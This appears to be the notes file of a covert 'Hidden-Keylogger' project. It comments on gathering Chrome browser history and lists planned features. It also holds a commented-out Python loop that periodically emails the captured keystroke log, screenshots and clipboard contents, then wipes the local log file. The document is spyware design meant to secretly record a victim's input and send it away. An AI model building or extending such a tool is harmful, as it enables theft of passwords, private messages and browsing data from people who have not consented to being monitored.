# Hidden-Keylogger

# Call the function to gather browser history
# The gather_browser_history function is trying to get the browser history by using the tasklist command. However, the tasklist command does not provide browser history. It only lists the currently running tasks or services in your system.
# If you want to gather browser history, you would need to access the SQLite databases that browsers like Chrome and Firefox use to store history data. This is a complex task and involves understanding the database schema used by each browser. Also, it's important to note that accessing browser history without user consent can be a violation of privacy.
# Here's a simplified example of how you might access Chrome's history (this will only work if Chrome is not currently running, as the database will be locked otherwise). This code opens the history SQLite database that Chrome uses to store browsing history, and writes each URL to a file. Note that this is a simplified example and may not work in all cases, especially if the user has multiple Chrome profiles or if the database schema changes in a future Chrome update


#Scope of improvements:
# 1. Add a feature to send the all contents to email
# 2. Combination of keystrokes with ctrl not handled properly 
# 3. Numeric numbers on numpad can be capruted properly


#Email part
 # if currentTime > stoppingTime:
    #     # Send keylogger contents to email
    #     send_email(keys_information, file_path + extend + keys_information)
    #     # Clear contens of keylogger log file.
    #     with open("keylogger.txt", "w") as f:
    #         f.write(" ")
    #     # Take a screenshot and send to email
    #     screenshot()
    #     send_email(screenshot_information, file_path + extend + screenshot_information)
    #     # Gather clipboard contents and send to email
    #     copy_clipboard()
    #     send_email(clipboard_information, file_path + extend + clipboard_information)

    #     # Increase iteration by 1
    #     number_of_iterations += 1
    #     # Update current time
    #     currentTime = time.time()
    #     stoppingTime = time.time() + time_iteration
